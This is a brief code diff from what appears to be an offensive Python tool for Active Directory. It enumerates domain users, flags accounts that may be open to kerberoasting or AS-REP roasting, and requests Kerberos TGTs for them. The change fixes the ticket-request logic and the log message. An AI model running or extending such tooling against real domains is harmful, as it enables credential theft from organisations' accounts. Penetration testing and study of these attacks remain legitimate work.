@@ -45,7 +45,7 @@ def enumerate_user(user, domain, dc):
             print(e)
             return None
     except Exception as e:
-        print(f'[+] possible kerberoastable or asrep raostable user: {user}')
+        print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
         return user
         
 
@@ -90,9 +90,10 @@ def enumerate_user(user, domain, dc):
 def get_userTGT(user, domain, dc):
     valid = enumerate_user(user, domain, dc)
     if valid != None:
-        T = TGT(domain=domain, username=user, dc=dc, preauth=False)
+        T = TGT(domain=domain, username=valid, dc=dc)
         tgt_data = T.run()
-    tgt_data = None
+    else:
+        tgt_data = None
     return tgt_data
     # if tgt_data != None:
     #     tgt = tgt_data['tgt']
